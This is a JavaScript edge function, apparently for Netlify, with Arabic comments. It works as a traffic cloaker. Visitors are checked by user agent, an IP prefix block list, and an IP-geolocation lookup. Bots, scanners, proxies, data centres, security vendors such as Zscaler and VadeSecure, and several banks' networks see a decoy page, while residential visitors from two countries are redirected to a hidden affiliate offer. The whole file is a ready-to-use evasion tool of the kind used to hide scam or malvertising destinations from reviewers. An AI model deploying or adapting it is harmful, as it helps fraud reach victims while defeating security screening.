export default async (request, context) => {
  // =====================
  // CONFIG
  // =====================
  const user_url = "https://www.aucsite.com/27X9TTQ2/7M8X59F1/?creative_id=14101";
  const allowed_countries = ['US', 'MA'];
  
  // مدة منع التكرار للزائر الثواني (مثلاً 10800 ثانية = 3 ساعات)
  const DUPLICATE_BLOCK_TIME = 10800;

  // =====================
  // 0. DUPLICATE CLICK CHECK (COOKIE)
  // =====================
  const cookieHeader = request.headers.get("cookie") || "";
  if (cookieHeader.includes("already_clicked=1")) {
    // الزائر كليكا مؤخراً، تحويل لـ Safe Page
    return Response.redirect(new URL("/index.html", request.url).toString(), 302);
  }

  // =====================
  // BLACKLISTS (ISP & DATACENTERS)
  // =====================
  const black_list = [
    "Microsoft", "Microsoft Corp", "Microsoft Limited", "Amazon", "Amazon Technologies", 
    "Digital Ocean", "Cisco Opendns", "Hostpapa", "Interconnecx", "Quality Technology", 
    "U.s.next", "Longwood Medical", "Fastly", "Code 200", "Netease", "Snmp Research", 
    "Ifworld", "Royell Communications", "Penteledata", "Level 3 Parent", "Oakland Schools", 
    "Smithville Digital", "Cleardocks", "Indonesia Online", "Apple", "Zoho", "Leaseweb", 
    "OVH", "CompleTel", "Ozone", "Herault", "Supernet", "Interveille", "hosting", 
    "VIALIS", "LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", "Commerciale", "CRIHAN", 
    "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT", "INFOMIL-CLTPARIS", "NORDNET", 
    "Technologies", "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", "Interministerielle", 
    "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", "Adista", "KEYYO", 
    "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", "ALTSYSNET-OCCITANET5G", 
    "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", "velia.net", "NATIXIS", 
    "Electricite", "Hub", "Labs", "Lyre", "Serveurcom", "Rezopole", "Appliwave", 
    "Epargne", "Anexia", "Caisse", "Sewan", "Reunicable", "Axione", "Scalair", "Colt", 
    "epargne", "caisse", "Poste", "Nerim", "Choopa", "SPIE", "Paritel", "DATACENTER", 
    "Layer", "ZSCALER", "Coaxis", "Firewall", "RENATER", "Online", "Traitement", 
    "Dedicated", "Owentis", "Coriolis", "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", 
    "Holdings", "LLC", "NSC-SOLUTIONS", "Backbone", "VadeSecure", "Datacamp", "Momax", 
    "Mutuel", "FIMATEX", "NEO", "Credit", "Agricole", "PSINet", "Skylogic", "Herault-networks", 
    "Alliance", "Connectic", "MYSTREAM", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", 
    "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele", "YouSee", 
    "DigitalOcean", "Linode", "Hetzner", "CenturyLink", "Host Depot", "Zayo", "Akamai"
  ];

  // IP Prefixes المستخرجة من CSV ومن القائمة السابقة
  const block_list = [
    // IPs من ملف CSV
    "74.179.", "72.153.", "62.10.", "51.54.", "128.85.", "134.209.", "157.230.", 
    "104.244.", "146.112.", "16.146.", "16.148.", "18.224.", "192.227.", "3.87.", 
    "34.122.", "35.81.", "52.13.", "52.34.", "54.203.", "9.169.",
    // IPs القديمة
    "204.193.", "144.208.", "134.174.", "216.98.", "103.4.", "103.129.", 
    "135.232.", "136.143.", "142.91.", "208.80.", "12.182.", "74.202.", 
    "204.186.", "2a04:4e41:", "17.", "35.91.", "54.149.", "72.152.", 
    "82.22.", "192.147.", "128.119.", "128.8.", "216.11.", "134.199.", 
    "172.68.", "172.69.", "172.70.", "172.71.", "162.158.", "108.162.", 
    "172.64.", "141.101.", "104.16.", "104.17.", "104.18.", "104.19.",
    "193.56.2", "92.147.12.196", "194.78", "37.201.192.242", "79.166.147.44", 
    "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30", "194.206", 
    "185.", "176.149.93", "82.120.84", "94.143.176", "185.228.2", "176.148.157", 
    "193.57", "89.210.43.74", "62.74.15.205", "2.10.4", "92.184", "109.221", 
    "81.169.144", "141.38.12", "94.100.133.41", "141.38.1", "212.11.224", 
    "212.11.225", "79.141.36.131"
  ];

  // =====================
  // GET IP & USER AGENT
  // =====================
  const ip = context.ip || request.headers.get("x-forwarded-for")?.split(',')[0].trim() || "127.0.0.1";
  const userAgent = request.headers.get("user-agent") || "";

  // =====================
  // USER AGENT / BOT FILTER
  // =====================
  if (!userAgent || userAgent.length < 10) {
    return Response.redirect(new URL("/index.html", request.url).toString(), 302);
  }

  const bad_agents = ['bot', 'crawl', 'spider', 'slurp', 'facebook', 'python', 'curl', 'wget', 'headless', 'phantom', 'selenium', 'puppeteer'];
  if (bad_agents.some(agent => userAgent.toLowerCase().includes(agent))) {
    return Response.redirect(new URL("/index.html", request.url).toString(), 302);
  }

  // =====================
  // IP BLOCK LIST CHECK
  // =====================
  for (let prefix of block_list) {
    if (ip.startsWith(prefix)) {
      return Response.redirect(new URL("/index.html", request.url).toString(), 302);
    }
  }

  // =====================
  // GET GEO & PROXY DATA (API)
  // =====================
  try {
    const apiRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode,isp,hosting,proxy`);
    const data = await apiRes.json();

    if (data && data.status === 'success') {
      const country = data.countryCode || 'XX';
      const isp = data.isp || 'Unknown';
      const is_hosting = data.hosting || false;
      const is_proxy = data.proxy || false;

      // BLOCK PROXY / HOSTING
      if (is_proxy || is_hosting) {
        return Response.redirect(new URL("/index.html", request.url).toString(), 302);
      }

      // COUNTRY CHECK
      if (!allowed_countries.includes(country)) {
        return Response.redirect(new URL("/index.html", request.url).toString(), 302);
      }

      // ISP BLACKLIST
      for (let item of black_list) {
        if (isp.toLowerCase().includes(item.toLowerCase())) {
          return Response.redirect(new URL("/index.html", request.url).toString(), 302);
        }
      }
    }
  } catch (error) {
    // إيلا فشل الـ API يكمل مع الـ Rules اللولين
  }

  // =====================
  // ALLOWED (SET COOKIE & REDIRECT TO OFFER)
  // =====================
  const redirectResponse = Response.redirect(user_url, 302);
  redirectResponse.headers.set(
    "Set-Cookie", 
    `already_clicked=1; Path=/; Max-Age=${DUPLICATE_BLOCK_TIME}; HttpOnly; SameSite=Lax`
  );

  return redirectResponse;
};

export const config = { path: "/*" };
